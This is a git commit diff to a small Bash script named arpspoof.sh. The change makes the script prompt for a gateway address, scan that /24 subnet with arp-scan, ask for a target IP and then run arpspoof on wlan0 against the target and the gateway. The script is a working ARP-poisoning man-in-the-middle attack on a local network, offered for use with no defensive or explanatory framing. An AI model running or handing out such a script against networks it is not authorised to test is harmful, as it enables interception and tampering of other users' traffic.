2748f3084abe9101a83f9192509805882fc12499
ahmedham <ahmedhamada015@gmail.com>
2016-09-28 23:08:16 +0300

    Update arpspoof.sh

--- arpspoof.sh
+++ arpspoof.sh
@@ -3,23 +3,17 @@
 #THIS IS NEW EDIT **** DATE:28/09/2016 TIME:05:34 PM Egypt ****
 # *********************&&&&&&&&&&&&&*******^^^^^^^^^^^^^^^^^^****%%%%%%*************
 #ARPSCAN COMMANDS
-sudo arp-scan 192.168.1.1/24
+read -p "Please enter the Gateway to scan the ip:  " gateway
+sudo arp-scan $gateway/24
 #LOOP COMMNADS
 read -p "Pleas Enter The ip from above: " ip
-until [ $ip ]
+until [ $ip -a $gateway ]
 do
 	echo "******************************please enter the ip*******************************"
 	read -p "Pleas Enter The ip from above: " ip
+
 done
 #ARPSPOOF COMMANDS
-sudo arpspoof -i wlan0 -t $ip -r 192.168.1.1
+sudo arpspoof -i wlan0 -t $ip -r $gateway
 
 
-
-
-
-
-#**---------**************-----------------*****************----------------*********
-#THIS IS OLD COMMANDS
-#read -p "Enter the ip from above: " Ahmed
-#sudo arpspoof -i wlan0 -t $Ahmed -r 192.168.1.1
